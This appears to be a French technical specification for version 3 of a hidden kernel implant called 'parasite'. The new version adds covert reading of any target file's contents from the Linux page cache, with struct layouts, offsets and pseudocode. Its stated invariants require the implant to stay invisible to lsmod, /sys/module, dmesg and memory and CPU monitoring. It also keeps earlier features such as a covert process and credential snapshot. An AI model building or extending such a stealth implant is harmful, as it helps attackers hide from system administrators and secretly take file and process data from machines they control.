# V3 — Spécification Technique (Cahier des Charges)

---

## 0. Périmètre

V3 ajoute la **lecture du page cache** au co-kernel. Depuis un inode cible
fourni par le loader, le co-kernel navigue les structures VFS (`address_space`,
`xarray`) pour lire le contenu d'un fichier et le rapporter via la comm page.

**Base** : V2 est complet et fonctionnel. V3 NE DOIT PAS casser les
garanties V0, V1 ni V2.

---

## 1. Invariants (hérités, NE DOIVENT PAS être cassés)

| ID | Invariant | Vérification |
|----|-----------|--------------|
| INV-1 | Pas d'entrée dans `/proc/modules` | `lsmod \| wc -l` = 0 |
| INV-2 | Pas d'entrée dans `/sys/module/parasite*` | `ls /sys/module/parasite*` échoue |
| INV-3 | Pas de consommation mémoire visible | `MemTotal` stable (±4 MB) |
| INV-4 | Pas d'anomalie CPU visible | `perf stat sleep 1` normal |
| INV-5 | Pas de trace dmesg | `dmesg \| grep -ci parasite` = 0 |
| INV-6 | Handler PMI sans crash | 10 min d'opération, pas de panic |
| INV-7 | Heartbeat | `tick_count` non-nul et croissant |
| INV-8 | Direct map | `init_comm` = `"swapper/0"` |
| INV-9 | Snapshot processus | `nr_tasks > 0`, PID 0 et PID 1 présents (V2) |

---

## 2. Environnement matériel et VM

| Paramètre | Valeur |
|-----------|--------|
| Hypervisor | QEMU 9.x + KVM |
| Machine | q35 (ICH9) |
| CPU | `-cpu host` — 1 vCPU |
| RAM | 1 GB (`-m 1024`) |
| Noyau | Debian 6.12.73+deb13-amd64 |
| Console | Série (`-nographic`, `console=ttyS0`) |
| Host CPU | AMD Ryzen 7 5825U (ou compatible) |
| APIC | x2APIC |
| PMU | AMD PerfEvtSel0/PerfCtr0 |

---

## 3. Exigences fonctionnelles

### 3.1 Résolution du fichier cible (loader)

| ID | Exigence | Détails |
|----|----------|---------|
| **FILE-1** | Paramètre module | `target_path` (char *, défaut `"/tmp/test"`) |
| **FILE-2** | Résolution inode | `kern_path(target_path, LOOKUP_FOLLOW, &path)` → `d_inode(path.dentry)` |
| **FILE-3** | Conversion DM | `target_inode_dm = LINUX_DIRECT_MAP_BASE + virt_to_phys(inode)` |
| **FILE-4** | Fichier absent | Si `kern_path` échoue → `target_inode_dm = 0`, pas d'erreur fatale |
| **FILE-5** | path_put | Appeler `path_put(&path)` après extraction des données |

**VERIFY-FILE** : `pr_info("cokernel: target_inode_dm = 0x%llx")` affiché dans dmesg.

### 3.2 Offsets VFS (bootstrap data)

| ID | Exigence | Détails |
|----|----------|---------|
| **OFF-V3-1** | `offset_i_mapping` | `offsetof(struct inode, i_mapping)` |
| **OFF-V3-2** | `offset_i_size` | `offsetof(struct inode, i_size)` |
| **OFF-V3-3** | `offset_a_i_pages` | `offsetof(struct address_space, i_pages)` |
| **OFF-V3-4** | `offset_xa_head` | `offsetof(struct xarray, xa_head)` |
| **OFF-V3-5** | `offset_xa_node_slots` | `offsetof(struct xa_node, slots)` |
| **OFF-V3-6** | `vmemmap_base` | `(unsigned long)pfn_to_page(0)` — base du vmemmap |
| **OFF-V3-7** | `sizeof_struct_page` | `(unsigned long)sizeof(struct page)` |
| **OFF-V3-8** | Compatibilité V1/V2 | Les 13 champs V1/V2 ne changent PAS de position |

**VERIFY-OFF** : tous les offsets imprimés dans dmesg au chargement.

### 3.3 Lecture du page cache (co-kernel)

| ID | Exigence | Détails |
|----|----------|---------|
| **PC-1** | Vérifier inode valide | `target_inode_dm != 0` ET `in_direct_map(target_inode_dm)` |
| **PC-2** | Lire `i_mapping` | `mapping = *(uint64_t *)(inode + offset_i_mapping)` |
| **PC-3** | Lire `i_size` | `file_size = *(int64_t *)(inode + offset_i_size)` |
| **PC-4** | Accéder à l'xarray | `xa_head_addr = mapping + offset_a_i_pages + offset_xa_head` |
| **PC-5** | Traverser l'xarray | Descendre via `xa_node.slots[0]` tant que l'entrée est interne |
| **PC-6** | Convertir folio → phys | `pfn = (folio - vmemmap_base) / sizeof_struct_page` |
| **PC-7** | Lire le contenu | `data_va = direct_map_base + pfn * PAGE_SIZE` → `memcpy_ck()` |
| **PC-8** | Écrire dans comm page | Zone fichier de `data_buf` (offset 2000) |
| **PC-9** | Limiter la taille | `min(file_size, 1992)` octets copiés max |
| **PC-10** | Incrémenter `data_seq` | Après écriture complète du contenu fichier |

### 3.4 Identification des entrées xarray

| Type d'entrée | Condition | Action |
|----------------|-----------|--------|
| `NULL` | `entry == 0` | Pas de page en cache → `file_status = 2` |
| Pointeur folio | `(entry & 3) == 0` | Leaf — convertir en PFN et lire |
| Nœud interne | `(entry & 3) == 2` ET `entry > 4096` | `node = entry - 2`, descendre `slots[0]` |
| Value entry | `(entry & 1) == 1` | Swap/spécial — non supporté → `file_status = 3` |

### 3.5 Layout `data_buf` (V3)

| ID | Exigence | Détails |
|----|----------|---------|
| **BUF-1** | Split en deux zones | Zone processus [0..1999], zone fichier [2000..3999] |
| **BUF-2** | Zone processus | Identique à V2, capacité réduite à 62 entrées |
| **BUF-3** | `file_bytes` | `uint32_t` à l'offset 2000 — nombre d'octets valides |
| **BUF-4** | `file_status` | `uint32_t` à l'offset 2004 — code de statut |
| **BUF-5** | `file_content` | Octets [2008..3999] — contenu brut du fichier (1992 max) |

**Codes `file_status`** :

| Code | Signification |
|------|---------------|
| 0 | Lecture réussie |
| 1 | Pas d'inode cible (`target_inode_dm = 0`) |
| 2 | Page non trouvée dans le cache (xa_head NULL) |
| 3 | Entrée xarray non supportée (value/swap) |
| 4 | Pointeur invalide (hors direct map ou vmemmap) |
| 5 | Profondeur xarray excessive (> 4 niveaux) |

### 3.6 ck_reader (mise à jour V3)

| ID | Exigence | Détails |
|----|----------|---------|
| **READER-V3-1** | Décoder zone processus | Identique à V2 (nr_tasks, entries) |
| **READER-V3-2** | Décoder zone fichier | Lire `file_bytes` et `file_status` à l'offset 2000 |
| **READER-V3-3** | Afficher contenu | `"File content (N bytes): ..."` — afficher les N premiers octets |
| **READER-V3-4** | Afficher statut | `"File status: OK"` ou `"File status: NO_PAGE"` etc. |

### 3.7 Script de test (mise à jour)

| ID | Exigence | Détails |
|----|----------|---------|
| **TEST-V3-1** | Créer fichier cible | `echo "CANARY_V3_TEST" > /tmp/test` AVANT `insmod parasite.ko` |
| **TEST-V3-2** | Vérifier contenu | Sortie ck_reader contient `"CANARY_V3_TEST"` |
| **TEST-V3-3** | Vérifier taille | `file_bytes` = `wc -c < /tmp/test` |
| **TEST-V3-4** | Conserver tests V2 | Snapshot processus toujours affiché et comparé avec `ps` |

---

## 4. Structures de données

### 4.1 `ck_bootstrap_data` (V3)

```c
struct ck_bootstrap_data {
    /* V1 fields (positions FIXED — do NOT reorder) */
    uint64_t magic;               /*  0: COKERNEL_BOOTSTRAP_MAGIC */
    uint64_t init_task_dm;        /*  8: VA of init_task in direct map */
    uint64_t ram_size;            /* 16: total physical RAM in bytes */
    uint64_t self_phys_base;      /* 24: physical base of co-kernel allocation */
    uint64_t direct_map_base;     /* 32: 0xFFFF888000000000 */
    uint64_t comm_page_va;        /* 40: VA of comm page in co-kernel CR3 */
    uint64_t comm_page_phys;      /* 48: physical address for /dev/mem */
    uint64_t offset_task_comm;    /* 56: offsetof(task_struct, comm) */

    /* V2 additions: task_struct traversal */
    uint64_t offset_tasks;        /* 64: offsetof(task_struct, tasks) */
    uint64_t offset_pid;          /* 72: offsetof(task_struct, pid) */
    uint64_t offset_tgid;         /* 80: offsetof(task_struct, tgid) */
    uint64_t offset_real_cred;    /* 88: offsetof(task_struct, real_cred) */
    uint64_t offset_cred_uid;     /* 96: offsetof(struct cred, uid) */

    /* V3 additions: page cache reading */
    uint64_t target_inode_dm;     /* 104: DM address of target file inode */
    uint64_t offset_i_mapping;    /* 112: offsetof(struct inode, i_mapping) */
    uint64_t offset_i_size;       /* 120: offsetof(struct inode, i_size) */
    uint64_t offset_a_i_pages;    /* 128: offsetof(struct address_space, i_pages) */
    uint64_t offset_xa_head;      /* 136: offsetof(struct xarray, xa_head) */
    uint64_t offset_xa_node_slots;/* 144: offsetof(struct xa_node, slots) */
    uint64_t vmemmap_base;        /* 152: (unsigned long)pfn_to_page(0) */
    uint64_t sizeof_struct_page;  /* 160: sizeof(struct page) */
};
/* V3: 168 bytes (21 × 8). Fits within COKERNEL_DATA_SIZE (64 KB). */
```

### 4.2 Zone fichier dans `data_buf`

```
Offset (dans data_buf)  Size    Field
────────────────────────────────────────
0x7D0 (2000)            4       uint32_t file_bytes    (octets lus)
0x7D4 (2004)            4       uint32_t file_status   (code retour)
0x7D8 (2008)            1992    uint8_t  file_content[]
```

### 4.3 Constantes

```c
#define FILE_DATA_OFFSET       2000   /* offset dans data_buf pour zone fichier */
#define MAX_FILE_CONTENT_SIZE  1992   /* (4000 - 2000 - 8) */
#define MAX_SNAPSHOT_PROCS_V3  62     /* (2000 - 8) / 32 = 62 */
#define XA_MAX_DEPTH           4      /* profondeur max avant abandon */

/* file_status codes */
#define FILE_STATUS_OK         0
#define FILE_STATUS_NO_INODE   1
#define FILE_STATUS_NO_PAGE    2
#define FILE_STATUS_UNSUPPORTED 3
#define FILE_STATUS_BAD_PTR    4
#define FILE_STATUS_TOO_DEEP   5
```

---

## 5. Algorithme de lecture du page cache

```
function read_target_file(comm, boot):
    file_bytes_out  = &comm->data_buf[FILE_DATA_OFFSET]
    file_status_out = &comm->data_buf[FILE_DATA_OFFSET + 4]
    file_content    = &comm->data_buf[FILE_DATA_OFFSET + 8]

    // 1. Vérifier qu'un inode cible est configuré
    if boot->target_inode_dm == 0:
        *file_status_out = FILE_STATUS_NO_INODE
        *file_bytes_out  = 0
        return

    inode = boot->target_inode_dm
    if NOT in_direct_map(inode, boot):
        *file_status_out = FILE_STATUS_BAD_PTR
        return

    // 2. Lire i_mapping (struct address_space *)
    mapping = *(uint64_t *)(inode + boot->offset_i_mapping)
    if NOT in_direct_map(mapping, boot):
        *file_status_out = FILE_STATUS_BAD_PTR
        return

    // 3. Lire i_size (taille du fichier)
    file_size = *(int64_t *)(inode + boot->offset_i_size)
    bytes_to_read = min(file_size, MAX_FILE_CONTENT_SIZE)
    if bytes_to_read <= 0:
        *file_status_out = FILE_STATUS_NO_PAGE
        *file_bytes_out  = 0
        return

    // 4. Accéder à l'xarray : mapping + offset_a_i_pages + offset_xa_head
    xa_head_addr = mapping + boot->offset_a_i_pages + boot->offset_xa_head
    entry = *(void **)xa_head_addr

    // 5. Traverser l'xarray pour trouver la page à l'index 0
    depth = 0
    while entry != NULL AND depth < XA_MAX_DEPTH:
        if (entry & 3) == 2 AND entry > 4096:
            // Nœud interne — descendre via slots[0]
            node = entry - 2   // xa_to_node
            if NOT in_direct_map(node, boot):
                *file_status_out = FILE_STATUS_BAD_PTR
                return
            entry = *(void **)(node + boot->offset_xa_node_slots)  // slots[0]
            depth++
        else if (entry & 1) == 1:
            // Value entry (swap, etc.) — non supporté
            *file_status_out = FILE_STATUS_UNSUPPORTED
            *file_bytes_out  = 0
            return
        else:
            break   // Pointeur folio trouvé

    if entry == NULL:
        *file_status_out = FILE_STATUS_NO_PAGE
        *file_bytes_out  = 0
        return

    if depth >= XA_MAX_DEPTH:
        *file_status_out = FILE_STATUS_TOO_DEEP
        return

    // 6. Convertir folio → PFN → adresse physique
    folio = (unsigned long)entry
    pfn = (folio - boot->vmemmap_base) / boot->sizeof_struct_page
    phys = pfn * 4096   // PAGE_SIZE
    data_va = boot->direct_map_base + phys

    if NOT in_direct_map(data_va, boot):
        *file_status_out = FILE_STATUS_BAD_PTR
        return

    // 7. Copier le contenu dans la comm page
    memcpy_ck(file_content, data_va, bytes_to_read)
    *file_bytes_out  = bytes_to_read
    *file_status_out = FILE_STATUS_OK
    comm->data_seq++
```

**Complexité** : O(d) avec d = profondeur xarray (≤ 4). Pour un fichier
d'une seule page, d = 0 ou 1. Temps total < 1 μs.

---

## 6. Garde-fous et limites de sécurité

| ID | Garde-fou | Implémentation |
|----|-----------|----------------|
| **SAFE-V3-1** | Validation inode | `in_direct_map(target_inode_dm)` |
| **SAFE-V3-2** | Validation mapping | `in_direct_map(mapping)` |
| **SAFE-V3-3** | Validation xa_node | `in_direct_map(node)` à chaque niveau |
| **SAFE-V3-4** | Validation folio-pfn | `pfn * PAGE_SIZE < ram_size` |
| **SAFE-V3-5** | Validation data VA | `in_direct_map(data_va)` |
| **SAFE-V3-6** | Limite profondeur | `depth < 4` pour éviter boucle infinie |
| **SAFE-V3-7** | Limite taille | `min(file_size, 1992)` octets max |
| **SAFE-V3-8** | Lecture seule | Aucune écriture dans les structures VFS/xarray |
| **SAFE-V3-9** | Budget temps | Lecture < 5 μs (pas de boucle longue) |
| **SAFE-V3-10** | Entrées non supportées | Value entries (swap) → `FILE_STATUS_UNSUPPORTED` |

---

## 7. Plan de fichiers (delta depuis V2)

```
Modifiés :
  include/shared.h            ← 8 champs V3 + constantes fichier + split data_buf
  cokernel/cokernel.c         ← read_target_file() + appel dans component_tick()
  module/parasite_main.c      ← kern_path + offsets VFS + target_path param
  module/ck_reader.c          ← décodage zone fichier + affichage contenu
  scripts/build_rootfs.sh     ← création /tmp/test CANARY, vérification

Aucun nouveau fichier.
```

---

## 8. Pipeline de build et test

### 8.1 Build

Identique à V2 : `make module && make rootfs && make run`

### 8.2 Séquence de test en VM

```bash
# 1. init script crée /tmp/test AVANT chargement module
echo "CANARY_V3_TEST" > /tmp/test

# 2. insmod /lib/modules/parasite.ko
#    → loader résout /tmp/test → inode, écrit bootstrap_data

# 3. Vérification V0 : 6 checks d'invisibilité → All PASS

# 4. Vérification V1 : heartbeat + init_comm → OK

# 5. Vérification V3 : contenu fichier
insmod /lib/modules/ck_reader.ko comm_phys=0x...
# → dmesg montre :
#   ck_reader: File status: OK
#   ck_reader: File content (15 bytes): CANARY_V3_TEST

# 6. Vérification V2 : snapshot processus
# → nr_tasks > 0, PIDs correspondent à ps

# 7. Heartbeat check
sleep 2
insmod /lib/modules/ck_reader.ko comm_phys=0x...
# → tick_count a augmenté
```

### 8.3 Critères d'acceptation

| ID | Critère | Condition de succès |
|----|---------|---------------------|
| **V3-1** | Invariants V0/V1/V2 | INV-1 à INV-9 passent |
| **V3-2** | Fichier lu | `file_bytes > 0` ET `file_status = 0` |
| **V3-3** | Contenu CANARY | `file_content` contient `"CANARY_V3_TEST"` |
| **V3-4** | Taille correcte | `file_bytes` = `wc -c < /tmp/test` (15 avec newline) |
| **V3-5** | Snapshot processus | `nr_tasks > 0`, PID 0 et PID 1 présents |
| **V3-6** | Pas de crash | Système stable pendant 10+ secondes post-chargement |
| **V3-7** | Offsets loggés | dmesg contient tous les offsets V3 (offset_i_mapping, etc.) |
